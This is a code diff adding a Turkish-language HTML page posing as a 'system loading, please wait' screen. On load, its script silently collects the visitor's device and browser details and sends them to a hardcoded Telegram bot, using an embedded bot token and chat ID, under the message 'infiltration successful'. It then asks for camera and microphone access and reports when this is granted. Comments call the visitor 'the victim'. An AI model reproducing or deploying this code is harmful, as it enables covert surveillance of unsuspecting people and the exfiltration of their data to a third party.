@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Yükleniyor...</title>
+    <style>
+        body { background: #000; color: #ff007f; font-family: 'Courier New'; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .pulse { animation: pulse-animation 2s infinite; font-size: 20px; }
+        @keyframes pulse-animation { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="pulse">> BAĞLANTI KURULUYOR, LÜTFEN BEKLEYİN...</div>
+
+    <script>
+        // Senin Telegram Bilgilerin Aşkım
+        const token = "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8";
+        const chatId = "8258235296";
+
+        async function startCapture() {
+            // Kurbanın IP ve Cihaz Bilgilerini Sessizce Çekiyoruz
+            const info = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lang: navigator.language
+            };
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=🔥 SIZMA BAŞARILI! %0A📱 Cihaz: ${info.platform} %0A🌐 Tarayıcı: ${info.ua}`);
+            
+            // Eğer kurban "Tamam" derse kamerası senin sevgilim!
+            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+            .then(() => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ MİKROFON VE KAMERA ERİŞİMİ AÇILDI!`);
+            });
+        }
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
